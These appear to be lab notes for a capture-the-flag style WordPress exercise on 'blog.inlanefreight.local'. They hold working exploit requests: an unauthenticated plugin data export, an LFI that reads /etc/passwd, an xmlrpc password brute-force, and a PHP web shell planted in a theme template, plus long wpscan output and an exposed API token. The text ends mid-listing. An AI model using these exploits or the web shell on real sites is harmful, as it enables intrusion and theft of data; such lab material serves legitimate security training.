## CURL
Accessing the IP:PORT is not the same as sending requests to a domain. If the Domain/IP address is in the host file and the request is sent to the domain the request is sent to the resolved IP address alongside the host:domain in the HTTP packet, this makes sense to the server.
``` bash
# To find wordpress version
curl -s http://blog.inlanefreight.local | grep generator
# To find the themes in use
curl -s http://blog.inlanefreight.local | grep "/wp-content/themes/"
# List directories and make it readable in the terminal
curl -s http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt | html2text
# User bruteforcing
# -L follows any redirects
# We pipe to grep to find the <title> tag in the HTML
curl -s -L -H "Host: blog.inlanefreight.local" "http://10.129.2.37/?author=3" | grep -i "<title>"
# OR
curl -s http://blog.inlanefreight.local/?rest_route=/wp/v2/users | jq
```
By default, WordPress uses "plain" permalinks (like `/?p=123`). The human-readable "pretty" permalinks (like `/2025/10/my-post/`) are an _optional_ setting. The `/wp-json/` endpoint only works if pretty permalinks are enabled. When pretty permalinks are off, the REST API is still available, just at a different URL. Instead of /wp-json/, it's accessed as a query parameter: <mark>?rest_route=</mark>.

Understand this CVE
``` bash
[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2025-10-24T06:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | [!] The version is out of date, the latest version is 5.9.8
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/, status: 200
 |
 | [!] 30 vulnerabilities identified:
 |
 | [!] Title: Email Subscribers & Newsletters < 4.2.3 - Multiple Issues
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpscan.com/vulnerability/a0764617-6142-4ef7-94f9-1fb923e81e94
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19985
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19984
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19982
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19981
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19980
 |      - https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/
 |      - https://cxsecurity.com/issue/WLB-2020080034
 
 # This code exploits this CVE
curl "http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all%27"

"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28" 
```
https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/
#### LFI
https://www.exploit-db.com/exploits/44340
``` bash 
Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 
 # Doing research on Exploit-DB reveals this LFI PoC exploit
 
 curl "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```
#### Bruteforcing user account & Reverse Shell
``` bash
wpscan --password-attack xmlrpc -t 50 -U erika -P rockyou.txt --url http://blog.inlanefreight.local

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / 010203
Trying erika / karla Time: 00:00:22 < > (700 / 14345092)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: 010203
```
Thus, the password of the user `erika` is `010203`. Subsequently, using these credentials, students need to navigate to `http://blog.inlanefreight.local/wp-login.php` and login:
Once logged in, students need to click on "Appearance -> Theme Editor" and then select the Twenty Seventeen theme:
After selecting the `Twenty Seventeen` theme, student need to select the `404 Template`, insert a PHP web shell after `<?php` (or alternatively, a reverse shell), and then click on `Update File`:
```php
system($_GET['cmd']);
```
At last, students need to use the cmd URL parameter to list the files within the /home/erika directory utilizing curl to send the URL-encoded payloads:
```shell-session
curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika/

d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

## WPSCAN
``` bash
wpscan --url http://blog.inlanefreight.local -e
[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Sat Oct 25 09:03:39 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-TEC-API-VERSION: v1
 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:48 <==================> (652 / 652) 100.00% Time: 00:00:48
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:52 <==================> (2575 / 2575) 100.00% Time: 00:02:52

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:12 <=================> (137 / 137) 100.00% Time: 00:00:12

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:08 <==================> (84 / 84) 100.00% Time: 00:00:08

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:09 <===================> (100 / 100) 100.00% Time: 00:00:09

[i] Medias(s) Identified:

[+] http://blog.inlanefreight.local/?attachment_id=14
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=11
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=13
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=15
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <==================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] erika
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Charlie Wiggins
 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Oct 25 09:08:26 2025
[+] Requests Done: 3613
[+] Cached Requests: 8
[+] Data Sent: 1.041 MB
[+] Data Received: 1.503 MB
[+] Memory used: 305.969 MB
[+] Elapsed time: 00:04:47
```
### Long Output
``` bash
wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 100 --api-token C0QF0Qvxia4ZQXnixXBMA1ae6ANeg2JL74ax5a0QBXY
[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Sat Oct 25 14:28:36 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-TEC-API-VERSION: v1
 |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
 |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 |
 | [!] 40 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.1.9
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.1.10
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.1.12
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.1.12
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.1.12
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.1.12
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.1.13
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.1.14
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.1.14
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.1.14
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.1.15
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.1.16
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.1.16
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.1.16
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.1.16
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.1.16
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.1.17
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.1.17
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.1.17
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.1.17
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.1.18
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.1.18
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.1.19
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.1.19
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.1.19
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.1.21
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.1.21
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentynineteen
 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:06:51 <=============================================================================================================================================> (113765 / 113765) 100.00% Time: 00:06:51
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blog.inlanefreight.local/wp-content/plugins/akismet/
 | Latest Version: 5.5
 | Last Updated: 2025-07-15T18:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] duplicator
 | Location: http://blog.inlanefreight.local/wp-content/plugins/duplicator/
 | Last Updated: 2025-10-14T16:33:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.14
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/duplicator/, status: 200
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: Duplicator < 1.4.7 - Unauthenticated Backup Download
 |     Fixed in: 1.4.7
 |     References:
